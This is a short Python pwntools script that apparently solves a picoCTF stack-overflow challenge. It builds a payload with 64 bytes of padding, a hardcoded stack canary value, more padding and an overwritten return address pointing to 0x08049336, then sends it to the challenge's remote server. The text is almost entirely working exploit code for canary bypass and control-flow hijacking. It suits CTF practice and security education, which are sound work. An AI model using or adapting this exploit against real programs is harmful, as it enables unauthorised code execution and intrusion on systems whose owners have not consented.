from pwn import *
import binascii
import itertools
import string

# context.log_level = 'debug'
REMOTE = True
CANARY_OFFSET = 64

# overflow by 1 character and try out all possible combinations for that


def send(canary_value):
    payload = b'A' * CANARY_OFFSET
    payload += canary_value.encode()
    payload += b'A'*16
    payload += pack(0x08049336, 32, endianness='little')

    if REMOTE:
        r = remote('saturn.picoctf.net', 58172)

        c1 = r.recvuntil('>')
        r.sendline("300")
        c2 = r.recvuntil('>')
        # breakpoint()
        
        r.send(payload)
        
        content = r.recvall()
        print(content)
        if 'Corrupt' in content.decode():
            raise Exception(f"Nope for {canary_value}")
        else:
            return canary_value
            # breakpoint()

    else:
        f = open('payload', 'wb')
        f.write(payload)
        f.close()

canary_value = "BiRd"
send(canary_value)